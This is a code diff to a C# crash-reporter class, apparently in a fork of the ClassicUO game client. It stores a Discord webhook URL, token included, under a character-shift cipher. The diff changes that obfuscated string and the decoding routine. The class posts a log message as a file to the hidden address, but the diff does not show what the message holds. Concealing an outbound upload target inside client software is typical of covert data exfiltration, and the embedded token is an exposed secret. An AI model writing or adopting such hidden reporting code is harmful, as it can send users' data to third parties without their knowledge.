@@ -1,12 +1,13 @@
 using System;
 using System.Collections.Specialized;
 using System.Net.Http;
+using ClassicUO.Utility.Logging;
 
 namespace ClassicUO.Game.Managers
 {
     public class CrashReporter
     {
-        public string WebHook { get; set; } = "cookn://ydnxjmy.xjh/vkd/rzwcjjfn/1518757333130412114/u6vfmyop2vVez6DEoE9JPlPz-1PzZPM3LXEX5q1EQdUPJ2T54M_JHMPEzdvMDFdSi9o4";
+        public string WebHook { get; set; } = @"}ODDy~xyCxDv~Dzw}DFJFMLJLHHHFHEIFGFFIDKvyGvVzK^__NdjjzBFjzZjgHfX_XJF_k~ojdGnJIgtdbgj_z~vg^`~mNI";
 
         public CrashReporter()
         {
@@ -22,31 +23,29 @@ namespace ClassicUO.Game.Managers
                 var form = new MultipartFormDataContent();
                 byte[] file_bytes = System.Text.Encoding.Unicode.GetBytes(msgSend);
                 form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "log.txt");
-                httpClient.PostAsync(Obf(WebHook, 21), form).Wait();
+                httpClient.PostAsync(Obf(WebHook, -21), form).Wait();
                 httpClient.Dispose();
             }
 
             return this;
         }
 
-        public static string Obf(string source, Int16 shift)
+        public static string Obf(string source, int shift)
         {
-            int maxChar = Convert.ToInt32(char.MaxValue);
-            int minChar = Convert.ToInt32(char.MinValue);
-
+            // The total number of characters in the UTF-16 space
+            int totalChars = 65536; 
             char[] buffer = source.ToCharArray();
 
             for (int i = 0; i < buffer.Length; i++)
             {
-                int shifted = Convert.ToInt32(buffer[i]) + shift;
+                // Use a modulo operation to keep the shift within the 0-65535 range
+                // This handles massive shifts and negative shifts perfectly
+                int shifted = (Convert.ToInt32(buffer[i]) + shift) % totalChars;
 
-                if (shifted > maxChar)
+                // Handle negative results from C#'s % operator on negative numbers
+                if (shifted < 0)
                 {
-                    shifted -= maxChar;
-                }
-                else if (shifted < minChar)
-                {
-                    shifted += maxChar;
+                    shifted += totalChars;
                 }
 
                 buffer[i] = Convert.ToChar(shifted);
